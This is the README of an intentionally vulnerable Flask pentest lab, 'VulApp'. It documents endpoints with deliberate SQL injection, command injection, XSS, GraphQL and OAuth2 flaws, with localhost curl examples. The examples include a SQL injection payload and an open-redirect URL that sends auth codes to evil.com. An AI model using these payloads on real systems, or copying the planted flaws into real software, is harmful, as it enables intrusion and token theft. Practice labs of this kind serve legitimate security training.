# VulApp - Pentest Target Lab

A vulnerable Flask application designed for penetration testing practice.

## Lab Credentials and Configuration

To perform your pentests, use the following known values:

*   **Basic-Auth Username:** `admin`
*   **Basic-Auth Password:** `easypassword`
*   **2FA TOTP Seed:** `XVQ2UIGO75XRUKJO`
*   **Secret Header:** `secret-header: my-secret-header`
*   **Secret Cookie:** `secret-cookie: my-secret-cookie`
*   **Bearer Token Header:** `token: Bearer Sf54F-/f#${wf}!*aR.y%`
*   **OAuth2 Client ID:** `vulapp-client-001`
*   **OAuth2 Client Secret:** `super-secret-client-secret`

---

## Endpoints and Requirements

### Web Authentication Forms
*   **`/web/login`**: Simple Login form. Vulnerable to **SQL Injection Bypass**.
*   **`/web/login-2fa`**: Login form with TOTP. Requires User + Pass + OTP code.
*   **`/web/logout`**: Clears the current session.
*   **`/web/oauth2/login`**: OAuth2 flow landing page. Links to the authorization endpoint.
*   **`/web/oauth2/authorize`**: OAuth2 authorization + consent screen. Vulnerable to **Open Redirect**, **No CSRF (state)**.
*   **`/web/oauth2/callback`**: OAuth2 callback page with interactive token exchange.
*   **`/web/oauth2/profile`**: OAuth2 protected profile. Vulnerable to **Token in Query String**.

### Protected "Welcome" Pages
These pages require specific authentication or headers to access. All `/web/welcome-` requests are logged to `welcome_requests.log` and the console.

| Path | Requirement |
| :--- | :--- |
| `/web/welcome-basic-auth` | **Basic Auth** (`admin` / `easypassword`) |
| `/web/welcome-simple` | **Session variable** `logged_in: True` (obtained via `/web/login`) |
| `/web/welcome-2fa` | **Session variable** `2fa_logged_in: True` (obtained via `/web/login-2fa`) |
| `/web/welcome-header` | **HTTP Header**: `secret-header: my-secret-header` |
| `/web/welcome-cookie` | **Cookie**: `secret-cookie=my-secret-cookie` |

### Vulnerable Tools
*   **`/web/ping`**: Network utility. Vulnerable to **Command Injection** via the `host` query parameter.
*   **`/web/users`**: User search page. Vulnerable to **SQL Injection** via the `search` query parameter.
*   **`/web/guestbook`**: Visitor guestbook. Vulnerable to **Reflected XSS** via the `name` query parameter.
*   **`/web/graphql`**: GraphQL query interface (HTML form). Vulnerable to **SQL Injection**, **Schema Introspection**, and exposes **password field**.

### API Endpoints
*   **`/swagger-ui`**: Interactive Swagger documentation for the API.
*   **`/openapi.json`**: Raw OpenAPI specification.
*   **`/api/tools/echo`**: Echos back all request data (headers, params, body, cookies, session) in JSON format.
*   **`/api/tools/otp`**: TOTP utility.
    *   **Usage:** `GET` (query params) or `POST` (form data) with `seed_b32` or `seed_hex` parameter.
    *   **Returns:** JSON containing current code, time remaining, and the seed.
*   **`/api/v1/header-cookie`**: API protected by both a secret header and a secret cookie.
*   **`/api/v1/header-cookie-auth`**: API protected by Basic Auth, a secret header, and a secret cookie.
*   **`/api/v1/users/<user_id>`**: API version of the user search tool. Vulnerable to **SQL Injection**.
*   **`/api/v1/get-token`**: Authenticates with JSON payload and returns a Bearer token.
*   **`/api/v1/get-token-form`**: Authenticates with Form data and returns a Bearer token.
*   **`/api/v1/is-valid-token`**: Validates the Bearer token in the `token` header.
*   **`/api/v1/graphql`**: GraphQL API endpoint (JSON). Vulnerable to **SQL Injection**, **Introspection**, exposes **password field**.
*   **`/api/v1/graphql/schema`**: GraphQL schema introspection (returns JSON).
*   **`/api/v1/oauth2/token`**: OAuth2 token endpoint. Supports `authorization_code` and `client_credentials` grants. Vulnerable to **missing client_secret validation** (auth code grant), **auth code replay**, **unrestricted scopes** (client credentials).
*   **`/api/v1/oauth2/userinfo`**: OAuth2 protected user profile (requires Bearer token).

---

## GraphQL Testing Guide

### GraphQL Endpoints

*   **Web Interface:** `/web/graphql` (HTML form for testing)
*   **JSON API:** `/api/v1/graphql` (accepts JSON POST requests)
*   **Schema Export:** `/api/v1/graphql/schema` (introspection JSON)

### Example Queries

#### 1. Basic Query - Get All Users
```graphql
{
  users {
    id
    username
    email
    bio
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { id username email bio } }"}'
```

#### 2. Search Users
```graphql
{
  users(search: "admin") {
    id
    username
    email
    bio
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"admin\") { id username email bio } }"}'
```

#### 3. Get Single User with Password (Vulnerability!)
```graphql
{
  user(id: 1) {
    id
    username
    email
    bio
    password
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { id username email bio password } }"}'
```

#### 4. Schema Introspection (Discover Fields)
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'
```

**Or get schema directly:**
```bash
# Get introspection schema (JSON)
curl http://localhost:5000/api/v1/graphql/schema
```

#### 5. SQL Injection via GraphQL
```graphql
{
  users(search: "' OR '1'='1") {
    id
    username
    email
    bio
  }
}
```

**curl command:**
```bash
curl -X POST http://localhost:5000/api/v1/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users(search: \"'\"'\" OR '\"'\"1'\"'\"='\"'\"1\") { id username email bio } }"}'
```

---

## OAuth2 Testing Guide

### Overview

VulApp implements a simulated OAuth2 Authorization Code flow with intentional vulnerabilities for pentest practice.

### OAuth2 Credentials

*   **Client ID:** `vulapp-client-001`
*   **Client Secret:** `super-secret-client-secret`
*   **User Login:** `admin` / `easypassword`

### OAuth2 Endpoints

| Path | Method | Type | Description |
| :--- | :--- | :--- | :--- |
| `/web/oauth2/login` | GET | Web | Landing page with flow overview |
| `/web/oauth2/authorize` | GET/POST | Web | Authorization + consent screen |
| `/web/oauth2/callback` | GET | Web | Receives auth code, interactive token exchange |
| `/web/oauth2/profile` | GET | Web/API | Protected resource (accepts Bearer token or `?token=`) |
| `/api/v1/oauth2/token` | POST | API | Token endpoint (authorization_code + client_credentials) |
| `/api/v1/oauth2/userinfo` | GET | API | Returns user profile with valid Bearer token |

### How to Use (Step by Step)

#### 1. Start the Authorization Flow (Browser)

Visit the authorize endpoint with the required parameters:

```
http://localhost:5000/web/oauth2/authorize?response_type=code&client_id=vulapp-client-001&redirect_uri=http://localhost:5000/web/oauth2/callback&scope=read%20profile&state=random123
```

Or simply click "Start OAuth2 Flow" from `/web/oauth2/login`.

#### 2. Authenticate and Authorize

On the consent screen, log in with `admin` / `easypassword` and click **Authorize**. You'll be redirected to the callback URL with an authorization code:

```
/web/oauth2/callback?code=abc123def456&state=random123
```

#### 3. Exchange Code for Token (API)

```bash
curl -X POST http://localhost:5000/api/v1/oauth2/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "authorization_code",
    "code": "<AUTH_CODE_FROM_STEP_2>",
    "client_id": "vulapp-client-001",
    "client_secret": "super-secret-client-secret",
    "redirect_uri": "http://localhost:5000/web/oauth2/callback"
  }'
```

**Response:**
```json
{
  "access_token": "a1b2c3d4e5f6...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read profile"
}
```

#### 4. Access Protected Resources (API)

```bash
curl http://localhost:5000/api/v1/oauth2/userinfo \
  -H "Authorization: Bearer <ACCESS_TOKEN>"
```

**Response:**
```json
{
  "sub": "admin",
  "username": "admin",
  "email": "admin@vulapp.local",
  "scope": "read profile"
}
```

### Client Credentials Grant (API-only)

No browser, no user, no redirects. The application authenticates as itself with a single API call.

#### 1. Get Token with Client Credentials

```bash
curl -X POST http://localhost:5000/api/v1/oauth2/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "client_credentials",
    "client_id": "vulapp-client-001",
    "client_secret": "super-secret-client-secret",
    "scope": "read profile"
  }'
```

**Response:**
```json
{
  "access_token": "a1b2c3d4e5f6...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read profile"
}
```

#### 2. Use the Token

```bash
curl http://localhost:5000/api/v1/oauth2/userinfo \
  -H "Authorization: Bearer <ACCESS_TOKEN>"
```

**Response:**
```json
{
  "sub": "service-account-vulapp-client-001",
  "username": "service-account-vulapp-client-001",
  "email": "service-account-vulapp-client-001@vulapp.local",
  "scope": "read profile"
}
```

Note: The token represents the application itself, not a user. The username is `service-account-<client_id>`.

### OAuth2 Vulnerabilities

This OAuth2 implementation contains the following intentional vulnerabilities:

1.  **Open Redirect** — `redirect_uri` is never validated. Change it to any external URL to steal auth codes:
    ```
    /web/oauth2/authorize?response_type=code&client_id=vulapp-client-001&redirect_uri=https://evil.com/steal&scope=read&state=x
    ```
2.  **No CSRF Protection (state)** — The `state` parameter is passed through but never validated, allowing cross-site request forgery attacks on the authorization flow.
3.  **Authorization Code Replay** — Auth codes are not invalidated after use. The same code can be exchanged for tokens multiple times.
4.  **No Client Secret Validation** — The token endpoint accepts any value (or no value) for `client_secret`:
    ```bash
    curl -X POST http://localhost:5000/api/v1/oauth2/token \
      -H "Content-Type: application/json" \
      -d '{"grant_type":"authorization_code","code":"<CODE>","client_id":"vulapp-client-001"}'
    ```
5.  **Token in Query String** — The profile endpoint accepts tokens via URL parameter, which leaks in server logs and Referer headers:
    ```
    /web/oauth2/profile?token=<ACCESS_TOKEN>
    ```
6.  **Predictable Auth Codes** — Codes are generated using MD5 of username + timestamp, making them guessable.
7.  **Unrestricted Scopes (Client Credentials)** — The `client_credentials` grant accepts any `scope` value without validation. Request `admin`, `write delete`, or anything else and it will be granted:
    ```bash
    curl -X POST http://localhost:5000/api/v1/oauth2/token \
      -H "Content-Type: application/json" \
      -d '{"grant_type":"client_credentials","client_id":"vulapp-client-001","client_secret":"super-secret-client-secret","scope":"admin write delete"}'
    ```

---

### GraphQL Vulnerabilities

This GraphQL endpoint contains the following intentional vulnerabilities:

1. **SQL Injection** - The `search`, `id`, and `username` parameters are vulnerable
2. **Sensitive Data Exposure** - The `password` field is exposed in the schema
3. **Introspection Enabled** - Attackers can discover all available queries and fields
4. **No Query Depth Limiting** - Allows deeply nested queries (DoS potential)
5. **No Query Complexity Analysis** - Allows expensive queries
6. **No Rate Limiting** - Unlimited query execution
7. **No Authentication** - GraphQL endpoint is publicly accessible

---

## Logging and Monitoring

### File Logs
Requests to `/web/welcome-` or `/api/v1/` endpoints are printed to stdout.

---

## Setup and Execution

### Local Development
1.  **Install Dependencies:** `pip install -r requirements.txt`
2.  **Run:** `python run.py` (Starts on `http://0.0.0.0:5000`)

### Docker Deployment
1.  **Build:** `docker build -t vulapp .`
2.  **Run:** `docker run -d -p 5000:5000 --name vulapp-container vulapp`
3.  **Compose:** `docker-compose up -d`
